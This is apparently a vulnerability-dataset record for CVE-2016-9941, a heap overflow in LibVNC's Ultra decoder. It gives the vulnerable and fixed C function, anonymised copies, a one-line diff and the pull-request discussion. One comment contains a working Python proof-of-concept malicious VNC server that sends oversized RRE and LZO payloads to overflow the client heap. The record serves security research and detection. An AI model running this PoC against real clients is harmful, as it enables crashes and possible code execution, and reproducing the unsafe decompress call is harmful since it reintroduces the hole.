{
  "cve_id": "CVE-2016-9941",
  "cwe_ids": [
    "CWE-119"
  ],
  "cvss_vector": "AV:N/AC:L/Au:N/C:P/I:P/A:P",
  "cvss_is_v3": false,
  "repo_name": "LibVNC/libvncserver",
  "commit_msg": "Fix heap overflow in the ultra.c decoder\n\nThe Ultra type tile decoder does not use the _safe variant of the LZO\ndecompress function, which allows a maliciuous server to overwrite parts of the\nheap by sending a larger-than-specified LZO data stream.",
  "commit_hash": "5fff4353f66427b467eb29e5fdc1da4f2be028bb",
  "git_url": "https://github.com/LibVNC/libvncserver/commit/5fff4353f66427b467eb29e5fdc1da4f2be028bb",
  "file_path": "libvncclient/ultra.c",
  "func_name": "HandleUltraZipBPP",
  "func_before": "static rfbBool\nHandleUltraZipBPP (rfbClient* client, int rx, int ry, int rw, int rh)\n{\n  rfbZlibHeader hdr;\n  int i=0;\n  int toRead=0;\n  int inflateResult=0;\n  unsigned char *ptr=NULL;\n  lzo_uint uncompressedBytes = ry + (rw * 65535);\n  unsigned int numCacheRects = rx;\n\n  if (!ReadFromRFBServer(client, (char *)&hdr, sz_rfbZlibHeader))\n    return FALSE;\n\n  toRead = rfbClientSwap32IfLE(hdr.nBytes);\n\n  if (toRead==0) return TRUE;\n\n  if (uncompressedBytes==0)\n  {\n      rfbClientLog(\"ultrazip error: rectangle has 0 uncomressed bytes (%dy + (%dw * 65535)) (%d rectangles)\\n\", ry, rw, rx); \n      return FALSE;\n  }\n\n  /* First make sure we have a large enough raw buffer to hold the\n   * decompressed data.  In practice, with a fixed BPP, fixed frame\n   * buffer size and the first update containing the entire frame\n   * buffer, this buffer allocation should only happen once, on the\n   * first update.\n   */\n  if ( client->raw_buffer_size < (int)(uncompressedBytes + 500)) {\n    if ( client->raw_buffer != NULL ) {\n      free( client->raw_buffer );\n    }\n    client->raw_buffer_size = uncompressedBytes + 500;\n    /* buffer needs to be aligned on 4-byte boundaries */\n    if ((client->raw_buffer_size % 4)!=0)\n      client->raw_buffer_size += (4-(client->raw_buffer_size % 4));\n    client->raw_buffer = (char*) malloc( client->raw_buffer_size );\n  }\n\n \n  /* allocate enough space to store the incoming compressed packet */\n  if ( client->ultra_buffer_size < toRead ) {\n    if ( client->ultra_buffer != NULL ) {\n      free( client->ultra_buffer );\n    }\n    client->ultra_buffer_size = toRead;\n    client->ultra_buffer = (char*) malloc( client->ultra_buffer_size );\n  }\n\n  /* Fill the buffer, obtaining data from the server. */\n  if (!ReadFromRFBServer(client, client->ultra_buffer, toRead))\n      return FALSE;\n\n  /* uncompress the data */\n  uncompressedBytes = client->raw_buffer_size;\n  inflateResult = lzo1x_decompress(\n              (lzo_byte *)client->ultra_buffer, toRead,\n              (lzo_byte *)client->raw_buffer, &uncompressedBytes, NULL);\n  if ( inflateResult != LZO_E_OK ) \n  {\n    rfbClientLog(\"ultra decompress returned error: %d\\n\",\n            inflateResult);\n    return FALSE;\n  }\n  \n  /* Put the uncompressed contents of the update on the screen. */\n  ptr = (unsigned char *)client->raw_buffer;\n  for (i=0; i<numCacheRects; i++)\n  {\n    unsigned short sx, sy, sw, sh;\n    unsigned int se;\n\n    memcpy((char *)&sx, ptr, 2); ptr += 2;\n    memcpy((char *)&sy, ptr, 2); ptr += 2;\n    memcpy((char *)&sw, ptr, 2); ptr += 2;\n    memcpy((char *)&sh, ptr, 2); ptr += 2;\n    memcpy((char *)&se, ptr, 4); ptr += 4;\n\n    sx = rfbClientSwap16IfLE(sx);\n    sy = rfbClientSwap16IfLE(sy);\n    sw = rfbClientSwap16IfLE(sw);\n    sh = rfbClientSwap16IfLE(sh);\n    se = rfbClientSwap32IfLE(se);\n\n    if (se == rfbEncodingRaw)\n    {\n        CopyRectangle(client, (unsigned char *)ptr, sx, sy, sw, sh);\n        ptr += ((sw * sh) * (BPP / 8));\n    }\n  }  \n\n  return TRUE;\n}",
  "abstract_func_before": "static rfbBool\nHandleUltraZipBPP (rfbClient* VAR_0, int VAR_1, int VAR_2, int VAR_3, int VAR_4)\n{\n  rfbZlibHeader VAR_5;\n  int VAR_6=0;\n  int VAR_7=0;\n  int VAR_8=0;\n  unsigned char *VAR_9=NULL;\n  lzo_uint VAR_10 = VAR_2 + (VAR_3 * 65535);\n  unsigned int VAR_11 = VAR_1;\n\n  if (!ReadFromRFBServer(VAR_0, (char *)&VAR_5, VAR_12))\n    return FALSE;\n\n  VAR_7 = rfbClientSwap32IfLE(VAR_5.nBytes);\n\n  if (VAR_7==0) return TRUE;\n\n  if (VAR_10==0)\n  {\n      rfbClientLog(\"ultrazip error: rectangle has 0 uncomressed bytes (%dy + (%dw * 65535)) (%d rectangles)\\n\", VAR_2, VAR_3, VAR_1); \n      return FALSE;\n  }\n\n  /* COMMENT_0 */\n                                                                   \n                                                                 \n                                                                   \n                  \n     \n  if ( VAR_0->raw_buffer_size < (int)(VAR_10 + 500)) {\n    if ( VAR_0->raw_buffer != NULL ) {\n      free( VAR_0->raw_buffer );\n    }\n    VAR_0->raw_buffer_size = VAR_10 + 500;\n    /* COMMENT_6 */\n    if ((VAR_0->raw_buffer_size % 4)!=0)\n      VAR_0->raw_buffer_size += (4-(VAR_0->raw_buffer_size % 4));\n    VAR_0->raw_buffer = (char*) malloc( VAR_0->raw_buffer_size );\n  }\n\n \n  /* COMMENT_7 */\n  if ( VAR_0->ultra_buffer_size < VAR_7 ) {\n    if ( VAR_0->ultra_buffer != NULL ) {\n      free( VAR_0->ultra_buffer );\n    }\n    VAR_0->ultra_buffer_size = VAR_7;\n    VAR_0->ultra_buffer = (char*) malloc( VAR_0->ultra_buffer_size );\n  }\n\n  /* COMMENT_8 */\n  if (!ReadFromRFBServer(VAR_0, VAR_0->ultra_buffer, VAR_7))\n      return FALSE;\n\n  /* COMMENT_9 */\n  VAR_10 = VAR_0->raw_buffer_size;\n  VAR_8 = lzo1x_decompress(\n              (lzo_byte *)VAR_0->ultra_buffer, VAR_7,\n              (lzo_byte *)VAR_0->raw_buffer, &VAR_10, NULL);\n  if ( VAR_8 != VAR_13 ) \n  {\n    rfbClientLog(\"ultra decompress returned error: %d\\n\",\n            VAR_8);\n    return FALSE;\n  }\n  \n  /* COMMENT_10 */\n  VAR_9 = (unsigned char *)VAR_0->raw_buffer;\n  for (VAR_6=0; VAR_6<VAR_11; VAR_6++)\n  {\n    unsigned short VAR_14, VAR_15, VAR_16, VAR_17;\n    unsigned int VAR_18;\n\n    memcpy((char *)&VAR_14, VAR_9, 2); VAR_9 += 2;\n    memcpy((char *)&VAR_15, VAR_9, 2); VAR_9 += 2;\n    memcpy((char *)&VAR_16, VAR_9, 2); VAR_9 += 2;\n    memcpy((char *)&VAR_17, VAR_9, 2); VAR_9 += 2;\n    memcpy((char *)&VAR_18, VAR_9, 4); VAR_9 += 4;\n\n    VAR_14 = rfbClientSwap16IfLE(VAR_14);\n    VAR_15 = rfbClientSwap16IfLE(VAR_15);\n    VAR_16 = rfbClientSwap16IfLE(VAR_16);\n    VAR_17 = rfbClientSwap16IfLE(VAR_17);\n    VAR_18 = rfbClientSwap32IfLE(VAR_18);\n\n    if (VAR_18 == VAR_19)\n    {\n        CopyRectangle(VAR_0, (unsigned char *)VAR_9, VAR_14, VAR_15, VAR_16, VAR_17);\n        VAR_9 += ((VAR_16 * VAR_17) * (VAR_20 / 8));\n    }\n  }  \n\n  return TRUE;\n}",
  "func_graph_path_before": "LibVNC/libvncserver/5fff4353f66427b467eb29e5fdc1da4f2be028bb/ultra.c/vul/before/0.json",
  "func": "static rfbBool\nHandleUltraZipBPP (rfbClient* client, int rx, int ry, int rw, int rh)\n{\n  rfbZlibHeader hdr;\n  int i=0;\n  int toRead=0;\n  int inflateResult=0;\n  unsigned char *ptr=NULL;\n  lzo_uint uncompressedBytes = ry + (rw * 65535);\n  unsigned int numCacheRects = rx;\n\n  if (!ReadFromRFBServer(client, (char *)&hdr, sz_rfbZlibHeader))\n    return FALSE;\n\n  toRead = rfbClientSwap32IfLE(hdr.nBytes);\n\n  if (toRead==0) return TRUE;\n\n  if (uncompressedBytes==0)\n  {\n      rfbClientLog(\"ultrazip error: rectangle has 0 uncomressed bytes (%dy + (%dw * 65535)) (%d rectangles)\\n\", ry, rw, rx); \n      return FALSE;\n  }\n\n  /* First make sure we have a large enough raw buffer to hold the\n   * decompressed data.  In practice, with a fixed BPP, fixed frame\n   * buffer size and the first update containing the entire frame\n   * buffer, this buffer allocation should only happen once, on the\n   * first update.\n   */\n  if ( client->raw_buffer_size < (int)(uncompressedBytes + 500)) {\n    if ( client->raw_buffer != NULL ) {\n      free( client->raw_buffer );\n    }\n    client->raw_buffer_size = uncompressedBytes + 500;\n    /* buffer needs to be aligned on 4-byte boundaries */\n    if ((client->raw_buffer_size % 4)!=0)\n      client->raw_buffer_size += (4-(client->raw_buffer_size % 4));\n    client->raw_buffer = (char*) malloc( client->raw_buffer_size );\n  }\n\n \n  /* allocate enough space to store the incoming compressed packet */\n  if ( client->ultra_buffer_size < toRead ) {\n    if ( client->ultra_buffer != NULL ) {\n      free( client->ultra_buffer );\n    }\n    client->ultra_buffer_size = toRead;\n    client->ultra_buffer = (char*) malloc( client->ultra_buffer_size );\n  }\n\n  /* Fill the buffer, obtaining data from the server. */\n  if (!ReadFromRFBServer(client, client->ultra_buffer, toRead))\n      return FALSE;\n\n  /* uncompress the data */\n  uncompressedBytes = client->raw_buffer_size;\n  inflateResult = lzo1x_decompress_safe(\n              (lzo_byte *)client->ultra_buffer, toRead,\n              (lzo_byte *)client->raw_buffer, &uncompressedBytes, NULL);\n  if ( inflateResult != LZO_E_OK ) \n  {\n    rfbClientLog(\"ultra decompress returned error: %d\\n\",\n            inflateResult);\n    return FALSE;\n  }\n  \n  /* Put the uncompressed contents of the update on the screen. */\n  ptr = (unsigned char *)client->raw_buffer;\n  for (i=0; i<numCacheRects; i++)\n  {\n    unsigned short sx, sy, sw, sh;\n    unsigned int se;\n\n    memcpy((char *)&sx, ptr, 2); ptr += 2;\n    memcpy((char *)&sy, ptr, 2); ptr += 2;\n    memcpy((char *)&sw, ptr, 2); ptr += 2;\n    memcpy((char *)&sh, ptr, 2); ptr += 2;\n    memcpy((char *)&se, ptr, 4); ptr += 4;\n\n    sx = rfbClientSwap16IfLE(sx);\n    sy = rfbClientSwap16IfLE(sy);\n    sw = rfbClientSwap16IfLE(sw);\n    sh = rfbClientSwap16IfLE(sh);\n    se = rfbClientSwap32IfLE(se);\n\n    if (se == rfbEncodingRaw)\n    {\n        CopyRectangle(client, (unsigned char *)ptr, sx, sy, sw, sh);\n        ptr += ((sw * sh) * (BPP / 8));\n    }\n  }  \n\n  return TRUE;\n}",
  "abstract_func": "static rfbBool\nHandleUltraZipBPP (rfbClient* VAR_0, int VAR_1, int VAR_2, int VAR_3, int VAR_4)\n{\n  rfbZlibHeader VAR_5;\n  int VAR_6=0;\n  int VAR_7=0;\n  int VAR_8=0;\n  unsigned char *VAR_9=NULL;\n  lzo_uint VAR_10 = VAR_2 + (VAR_3 * 65535);\n  unsigned int VAR_11 = VAR_1;\n\n  if (!ReadFromRFBServer(VAR_0, (char *)&VAR_5, VAR_12))\n    return FALSE;\n\n  VAR_7 = rfbClientSwap32IfLE(VAR_5.nBytes);\n\n  if (VAR_7==0) return TRUE;\n\n  if (VAR_10==0)\n  {\n      rfbClientLog(\"ultrazip error: rectangle has 0 uncomressed bytes (%dy + (%dw * 65535)) (%d rectangles)\\n\", VAR_2, VAR_3, VAR_1); \n      return FALSE;\n  }\n\n  /* COMMENT_0 */\n                                                                   \n                                                                 \n                                                                   \n                  \n     \n  if ( VAR_0->raw_buffer_size < (int)(VAR_10 + 500)) {\n    if ( VAR_0->raw_buffer != NULL ) {\n      free( VAR_0->raw_buffer );\n    }\n    VAR_0->raw_buffer_size = VAR_10 + 500;\n    /* COMMENT_6 */\n    if ((VAR_0->raw_buffer_size % 4)!=0)\n      VAR_0->raw_buffer_size += (4-(VAR_0->raw_buffer_size % 4));\n    VAR_0->raw_buffer = (char*) malloc( VAR_0->raw_buffer_size );\n  }\n\n \n  /* COMMENT_7 */\n  if ( VAR_0->ultra_buffer_size < VAR_7 ) {\n    if ( VAR_0->ultra_buffer != NULL ) {\n      free( VAR_0->ultra_buffer );\n    }\n    VAR_0->ultra_buffer_size = VAR_7;\n    VAR_0->ultra_buffer = (char*) malloc( VAR_0->ultra_buffer_size );\n  }\n\n  /* COMMENT_8 */\n  if (!ReadFromRFBServer(VAR_0, VAR_0->ultra_buffer, VAR_7))\n      return FALSE;\n\n  /* COMMENT_9 */\n  VAR_10 = VAR_0->raw_buffer_size;\n  VAR_8 = lzo1x_decompress_safe(\n              (lzo_byte *)VAR_0->ultra_buffer, VAR_7,\n              (lzo_byte *)VAR_0->raw_buffer, &VAR_10, NULL);\n  if ( VAR_8 != VAR_13 ) \n  {\n    rfbClientLog(\"ultra decompress returned error: %d\\n\",\n            VAR_8);\n    return FALSE;\n  }\n  \n  /* COMMENT_10 */\n  VAR_9 = (unsigned char *)VAR_0->raw_buffer;\n  for (VAR_6=0; VAR_6<VAR_11; VAR_6++)\n  {\n    unsigned short VAR_14, VAR_15, VAR_16, VAR_17;\n    unsigned int VAR_18;\n\n    memcpy((char *)&VAR_14, VAR_9, 2); VAR_9 += 2;\n    memcpy((char *)&VAR_15, VAR_9, 2); VAR_9 += 2;\n    memcpy((char *)&VAR_16, VAR_9, 2); VAR_9 += 2;\n    memcpy((char *)&VAR_17, VAR_9, 2); VAR_9 += 2;\n    memcpy((char *)&VAR_18, VAR_9, 4); VAR_9 += 4;\n\n    VAR_14 = rfbClientSwap16IfLE(VAR_14);\n    VAR_15 = rfbClientSwap16IfLE(VAR_15);\n    VAR_16 = rfbClientSwap16IfLE(VAR_16);\n    VAR_17 = rfbClientSwap16IfLE(VAR_17);\n    VAR_18 = rfbClientSwap32IfLE(VAR_18);\n\n    if (VAR_18 == VAR_19)\n    {\n        CopyRectangle(VAR_0, (unsigned char *)VAR_9, VAR_14, VAR_15, VAR_16, VAR_17);\n        VAR_9 += ((VAR_16 * VAR_17) * (VAR_20 / 8));\n    }\n  }  \n\n  return TRUE;\n}",
  "func_graph_path": "LibVNC/libvncserver/5fff4353f66427b467eb29e5fdc1da4f2be028bb/ultra.c/vul/after/0.json",
  "diff_func": "--- func_before\n+++ func_after\n@@ -55,7 +55,7 @@\n \n   /* uncompress the data */\n   uncompressedBytes = client->raw_buffer_size;\n-  inflateResult = lzo1x_decompress(\n+  inflateResult = lzo1x_decompress_safe(\n               (lzo_byte *)client->ultra_buffer, toRead,\n               (lzo_byte *)client->raw_buffer, &uncompressedBytes, NULL);\n   if ( inflateResult != LZO_E_OK ) ",
  "diff_line_info": {
    "deleted_lines": [
      "  inflateResult = lzo1x_decompress("
    ],
    "added_lines": [
      "  inflateResult = lzo1x_decompress_safe("
    ]
  },
  "is_vul": true,
  "pr_url": "https://github.com/LibVNC/libvncserver/pull/137",
  "description": {
    "pr_info": {
      "title": "Fix two heap buffer overflows",
      "number": 137
    },
    "comment": [
      "This PR fixes two unrelated buffer overflows, which can be used by a malicious server to overwrite parts of the heap and crash the client (or possibly execute arbitrary code). \r\n\r\nPoC (for `./client_examples/gtkvncviewer`):\r\n```\r\n#! /usr/bin/env python3\r\n\r\nimport asyncio\r\nimport struct\r\nimport lzo\r\nimport time\r\n\r\nclass EvilVNCProtocol(asyncio.Protocol):\r\n\r\n    def connection_made(self, transport):\r\n        self.transport = transport\r\n        # Note that we just ignore whatever the client says\r\n        self.transport.write(b\"RFB 003.008\\n\")\r\n        # Send supported security types (1 - None)\r\n        self.transport.write(b\"\\x01\\x01\")\r\n        # Confirm that authentication succeeded\r\n        self.transport.write(b\"\\x00\\x00\\x00\\x00\")\r\n        # Send ServerInit\r\n        self.transport.write(\r\n            struct.pack(\">HHBBBBHHHBBBBBBIB\",\r\n                        100, 100, # Framebuffer width and height\r\n                        32, # Bits per pixel\r\n                        8, # Color depth\r\n                        1, # Big endian\r\n                        1, # True Color\r\n                        255, 255, 255, # Color max values\r\n                        0, 8, 16, # Color shifts\r\n                        0, 0, 0, # Padding\r\n                        1, # Name length\r\n                        ord(\"E\") # Name\r\n            )\r\n        )\r\n        # For some reason, not waiting here led to the client occasionally\r\n        # dropping the rest of the input buffer\r\n        time.sleep(0.2)\r\n        # Send evil FramebufferUpdate\r\n        self.send_copyrect_crash()\r\n        #self.send_ultra_lzo_crash()\r\n\r\n    def send_copyrect_crash(self):\r\n        self.transport.write(\r\n            struct.pack(\">BBHHHHHi\",\r\n                        0, 0, # message-type and padding\r\n                        1, # number-of-rectangles\r\n                        10, 0, # x and y positions\r\n                        10, 10, # Width and height\r\n                        2, # encoding = RRE\r\n            )\r\n        )\r\n        self.transport.write(\r\n            struct.pack(\">IIIHHHH\",\r\n                        1, # nSubrects\r\n                        0x41414141, # Background pixel value\r\n                        0x42424242, # Rect pixel value\r\n                        10, 10000, 1, 1 # x, y, w, h\r\n            )\r\n        )\r\n\r\n    def send_ultra_lzo_crash(self):\r\n        self.transport.write(\r\n            struct.pack(\">BBHHHHHi\",\r\n                        0, 0, # message-type and padding\r\n                        1, # number-of-rectangles\r\n                        10, 0, # x and y positions\r\n                        10, 10, # Width and height\r\n                        9, # encoding = Ultra\r\n            )\r\n        )\r\n        data = lzo.compress(b\"A\" * 10000)\r\n        self.transport.write(\r\n            struct.pack(\">I\",\r\n                        len(data)\r\n            )\r\n        )\r\n        self.transport.write(data)\r\n\r\n    def data_received(self, data):\r\n        print(data)\r\n\r\n\r\nloop = asyncio.get_event_loop()\r\ncoro = loop.create_server(EvilVNCProtocol, \"0.0.0.0\", 5900)\r\nserver = loop.run_until_complete(coro)\r\n\r\nloop.run_forever()\r\n```",
      "I cannot get the PoC to run on Debian. Do you know which package to install to get lzo for python3? The other way around, it finds lzo with python2, but then asyncio is not available :-/\n",
      "I installed the python3 version directly from pip (https://pypi.python.org/pypi/python-lzo/1.08) (as it is not available in Gentoo repositories either).\n",
      "Tested && merged. Thanks a lot!",
      "I have been told that it is a good practice to report things like this as CVEs. Do you plan to do that or should I? I see that there are already some libvncserver/libvcnclient CVEs on the [list](http://www.cvedetails.com/product/8258/Libvncserver-Libvncserver.html?vendor_id=4842).",
      "If you could take care of that, I'd be very thankful indeed.",
      "Do you plan on doing a release any time soon? It probably would be useful to have a new version the CVE can refer to as fixed.",
      "Am Tue, 13 Dec 2016 12:34:15 -0800\nschrieb Josef Gajdusek <notifications@github.com>:\n\n> Do you plan on doing a release any time soon? It probably would be useful to\n> have a new version the CVE can refer to as fixed.\n> \n\nYes. 0.9.11 is due before x-mas.\n"
    ]
  },
  "Bug Filter": "Security Vulnerability Fix",
  "Bug Filter Confidence": 1.0,
  "Bug Filter Response": "**Final Classification:** Security Vulnerability Fix; **Confidence:** 1.0\n\nThe commit addresses a heap overflow in the Ultra decoder by switching to a safer decompression function, as confirmed by the PoC exploit description, clearly indicating a security fix."
}